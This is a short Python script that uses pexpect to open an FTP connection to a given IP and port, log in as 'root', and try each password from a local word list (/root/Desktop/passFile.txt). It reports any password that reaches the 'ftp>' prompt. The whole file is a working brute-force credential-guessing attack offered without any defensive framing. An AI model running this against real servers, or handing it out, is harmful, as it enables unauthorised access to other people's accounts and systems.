import pexpect

def connect(ip, port):
    
    connStr = 'ftp '+ip+' '+port
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.EOF, 'Name .*:', \
            '[P|p]assword:',pexpect.TIMEOUT], timeout=10 )

    fn = open('/root/Desktop/passFile.txt', 'r')

    #print(ret)
    if ret == 0 : #EOF
        #print('[-] Error connecting')   
        a = 0
        return a
    if ret == 1 : #FTP Service
        print('[+] This is FTP Service')
        child.sendline('root')
        ret = child.expect([pexpect.TIMEOUT, pexpect.EOF, \
                '[P|p]assword'], timeout=5)
        a = 1

        if ret == 2 :
            for line in fn.readlines():
                print(' [-] Password :', line.strip('\n'))
                child.sendline(line.strip('\n'))
                prom = child.expect([pexpect.EOF, pexpect.TIMEOUT, 'ftp>'], timeout=5)
                if prom == 2 :
                    print(' [+] FIND ! Password : ', line.strip('\n'))
        
        return a
    if ret == 2 : 
        #print('[+] This is FTP service.. ')
        a = 1
        return a
    else :
        a = 0
        return a
